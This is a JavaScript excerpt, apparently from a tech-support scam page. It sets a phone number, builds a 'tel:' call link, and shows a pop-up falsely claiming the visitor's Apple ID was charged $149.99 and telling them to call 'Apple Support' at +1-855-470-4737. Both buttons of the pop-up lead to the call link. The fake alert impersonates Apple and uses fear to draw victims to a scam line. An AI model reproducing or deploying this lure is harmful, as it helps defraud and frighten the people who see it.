        ...
        window.number = (window.number ? window.number : '+1-855-470-4737');
        ...
        function okkkk() {
            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-855-470-4737"></a>');
        ...
        function myFunction() {
            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-855-470-4737 to Freeze it!.")) {
                okkkk();
            } else {
                okkkk();
            }
